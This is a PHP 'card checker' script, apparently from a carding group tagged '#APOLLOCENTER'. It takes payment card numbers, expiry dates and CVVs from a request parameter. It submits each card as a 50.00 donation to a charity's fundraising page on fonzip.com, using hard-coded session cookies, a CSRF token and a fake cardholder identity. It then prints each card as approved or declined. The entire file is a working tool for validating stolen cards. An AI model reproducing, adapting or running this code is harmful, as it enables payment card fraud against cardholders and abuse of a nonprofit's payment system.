<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

/*$get = file_get_contents('https://randomuser.me/api/1.2/?nat=br');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];*/

//@LeaoApollo KIBA NAO NETFREE


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    
    
    
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}


 //CURL CC
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://fonzip.com/cydd/genel-bagis');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: fonzip.com',
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://fonzip.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://fonzip.com/cydd/genel-bagis',
'Accept-Language: pt-BR,pt;q=0.9',
'Cookie: fzcid=NEfeMXqQE7lNFmDGchkJC5J0NjW1L6RWUTDoMlBlDy9mqQEmoQqxouGSnnEEARUr; __cfduid=d03613ff3d5013fb0886295f9ad32642e1607350272; _fbp=fb.1.1607350275492.947685178; _ga=GA1.2.1519454562.1607350276; _gid=GA1.2.1874056905.1607350276',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken=Je4nwxALNMsvzzoiSkjB5zx4iclQVT3LQtsxwVLgMdg4k3pY4TppRYuWSg3tKE6g&currency_id=1&news_via_phone=&news_via_sms=&news_via_email=&amount=50.00&recurring=False&thanks_mail=13816&ngo=cydd&fundraising_page_id=1506&page_url=genel-bagis&cardholder_name=JULIANA+FURRTADA&email=aka10lma%40gmail.com&referring=&ref_to=&ref_email=&tckno=00000000000&phone=292+929+2929&address=Rua+Dona+Santa+Veloso%2C+134&city=S%C3%A3o+Paulo&district=S%C3%A3o+Paulo&birthday=&details=JULIANA+FURRTADA&donor_type=&recurring_limit=0&payment_type=cc&cc_no='.$cc.'&exp_month='.$mes.'&exp_year='.$ano.'&expiryMonth='.$mes.'&expiryYear='.$ano.'&cvv='.$cvv.'');
$retorn = curl_exec($ch);


//echo $retorn;

if(strpos($retorn, "auth.bb")){
    

echo "<font color='#FF0000'>Aprovada</font> <font color='#000000'> : ".$cc."|".$mes."|".$ano."|".$cvv."|  RETORNO:{[CVV INVALIDO]}  </font><font color='red'>#APOLLOCENTER</font><font color='#ffaa00'></font><font color='#aaff00'></font><font color='lime'></font><font color='#00ffaa'></font><font color='#00a9ff'></font><font color='blue'></font><font color='#aa00ff'></font><font color='#ff00aa'></font><br />";
        flush();
        ob_flush();
    }else{
        echo "<font color='#01DF01'>Reprovada</font> :  ".$cc."  ".$mes." ".$ano." ".$cvv."| RETORNO: {[NEGADO]}</font><font color='red'>#APOLLOCENTER</font><font color='#ffaa00'></font><font color='#aaff00'></font><font color='lime'></font><font color='#00ffaa'></font><font color='#00a9ff'></font><font color='blue'></font><font color='#aa00ff'></font><font color='#ff00aa'></font><br />";
        flush();
        ob_flush();
}
?>